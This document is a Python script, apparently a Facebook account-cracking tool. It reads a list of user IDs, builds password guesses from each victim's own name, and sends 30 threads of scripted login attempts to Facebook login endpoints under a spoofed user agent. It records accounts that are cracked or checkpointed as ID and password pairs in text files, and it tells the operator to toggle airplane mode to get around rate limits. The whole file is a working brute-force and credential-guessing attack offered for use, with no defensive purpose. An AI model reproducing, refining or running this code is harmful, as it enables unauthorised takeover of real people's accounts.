#!/bin/usr/python3
# -*- coding: utf-8 -*-
#creater: BilalHaiderID
#_________[ IMPORTING MODULES ]_______>>
import os,re,bs4,sys
from os import system as cmd
from time import sleep as slp
from bs4 import BeautifulSoup
from time import localtime as ltim
from random import choice as rch
import json,time,random,requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import collections
#_________[ BASIC COLOURS ]_______>>
rad = '\x1b[1;91m'
green = '\x1b[1;92m'
white = '\x1b[1;97m'
#_________[ CREATING CP/OK DIR ]_______>>
try:
	cmd("mkdir KING-CP")
except:
	pass
try:
	cmd("mkdir KING-OK")
except:
	pass
#_________[ CRACKING HOST LIST ]_______>>
host_list = [
	"mbasic.facebook.com",
	"free.facebook.com",
	"m.facebook.com",
	"p.facrbook.com",
	"h.facebook.com",
	"x.facebook.com",
	"0.facebook.com",
	"graph.facebook.com",
	"api.facebook.com"
	]
#_________[ FILESAVE CP/OK ]_______>>
fcp = "CP/CP-"+str(ltim()[2])+"-"+str(ltim()[1])+"-"+str(ltim()[0])+".txt"
fok = "OK/OK-"+str(ltim()[2])+"-"+str(ltim()[1])+"-"+str(ltim()[0])+".txt"
#_________[ LIST USERAGENT ]_____>>
list_useragent = ["User-Agent: Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]"]
#_________[ EMPTY INT/LISTS ]_____>>
ids = []
pwd = []
cps = []
oks = []
tls = []
tfs = []
loop = 0
#_________[ BANNER/LOGO ]_______>>
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
def clearscr():
    cmd("clear")
   
def logo():
    clearscr()
    print(f'''
{G}888    d8P  8888888  888b    888   .d8888b.  
{R}888   d8P     888    8888b   888  d88P  Y88b 
{G}888  d8P      888    88888b  888  888    888 
{P}888d88K       888    888Y88b 888  888        
{S}8888888b      888    888 Y88b888  888  88888 
{S}888  Y88b     888    888  Y88888  888    888 
{Y}888   Y88b    888    888   Y8888  Y88b  d88P 
{Y}888    Y88b 8888888  888    Y888   "Y8888P88 	
{uu}					???? ???? ???? ???? ???? 
\033[1;93m=================================
\033[1;97m Owner  : US4M4 K19G 
\033[1;97m GitHub : US4M4-K19G 
\033[1;97m Version:\033[1;92m 0.1 \033[1;97m
\033[1;97m Status : Free :/
\033[1;97m Notice : Use 10007/10006 For More OK Ids 
\033[1;93m=================================
''') 
#_________[ FILE CRACK ]_______>>
def file_crack():
	cmd("clear")
	logo()
	try:
		file = input('[->] Enter file path : ') 
		for uids in open(file, 'r').readlines():
			ids.append(uids.strip())
	except IOError:
		print("\n\n\t{}[{}+{}] Input Path Not Found ".format(white,rad,white))
		slp(1)
		file_crack()
	if len(ids)==0:
		print("\n\n\t{}[{}+{}] Ids not Found in file".format(white,rad,white))
		slp(1)
		file_crack()
	else:
		print("\r\r\n[{}+{}] Total collected ids: {}{}{}".format(green,white,green,(len(ids)),white))
	slp(1)
	cmd("clear")
	logo()
	limit = int(input("[+] Enter password limit : "))
	print("")
	for i in range(limit):
		i = i+1
		pwx = input(f"[*] Enter your password {green}{i}{white} : ")
		if len(pwx)>=6:
			if pwx not in pwd:
				pwd.append(pwx)
			else:
				pass
		elif pwx in ["first","last"]:
			pwd.append(pwx)
		else:
			pass
	cmd("clear")
	logo()
	print("{}[{}+{}] Input Facebook Web Host For Crack".format(white,green,white))
	print(f"\t\t{rad} example: {white} ")
	print(f"\t\t{rch(host_list)}\n\t\t{rch(host_list)}")
	host = input("\n[*] Your fb host : ")
	if host in host_list:
		pass
	else:
		host = "free.facebook.com"
	with ThreadPool(max_workers=30) as startcrack:
		tl = str(len(ids))
		cmd("clear")
		logo()
		print('\n-------------------------------------------------------')
		print("[*] Process has been started\n[*] On and Of Airplain mode \n[*] To stop process press Ctrl + Z")
		print('-------------------------------------------------------')
		for uids in ids:
			name = uids.split("|")[1]
			uid = uids.split("|")[0]
			pwx = pwd
			startcrack.submit(rcrack,uid,pwx,name,tl,host)
def rcrack(uid,pwx,name,tl,host):
	global loop
	global cps
	global oks
	global tls
	global fok
	global fcp
	global list_useragent
	first = name.split(" ")[0]
	first = first.lower()
	try:
		last = name.split(" ")[1]
		last = last.lower()
	except:
		last = first
	fullname = name.replace(" ","")
	fullname = fullname.lower()
	try:
		for ps in pwx:
			hostx = "https://"+host+"/"
			ps = ps.replace("first",first)
			ps = ps.replace("last",last)
			ps = ps.replace("fullname",fullname)
			session = requests.Session()
			pro = random.choice(list_useragent)
			headers_ = {"Host":host,"upgrade-insecure-requests":"1","User-Agent": 'Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]',"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":hostx,"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			free_fb = session.get(f'https://{host}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',headers=headers_).text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':host,
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-encoding':'utf-8',
			'accept-language': 'en-US,en;q=0.9',
			'referer': 'https://m.facebook.com/?paipv=0&eav=Afa_MmW_7sXVrhmH0PbRm71uQTpze0ysXQzhtbvaOAXPDqkOVNubHUw3nMg-ERe1hq8&_rdr',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': 'Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]',}
			lo = session.post(f'https://{host}/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text			
			log_cookies=session.cookies.get_dict().keys()
			#print(log_cookies)
			if 'c_user' in log_cookies:
				if uid in oks:
					pass
				else:
					print('\r\033[1;32m[US4M4-OK] '+uid+' | '+ps)
					oks.append(uid)
					open(fok,"w").write(uid+'|'+ps)
				break
			elif '/x/checkpoint' in log_cookies:
				print('\r\033[1;33m[TL] '+uid+' | '+ps )
				tls.append(uid)
				break
			elif 'checkpoint' in log_cookies:
				if uid in cps:
					pass
				else:
					print('\r\033[1;33m[US4M4-CP] '+uid+' | '+ps )
					open(fcp,"w").write(uid+'|'+ps)
					cps.append(uid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m%s/%s|\33[1;97mOK/CP/TF/TL:%s/%s/0/%s '%(tl,loop,len(oks),len(cps),len(tls))),
		sys.stdout.flush()
	except requests.exceptions.ConnectionError:
		time.sleep(10)
file_crack()
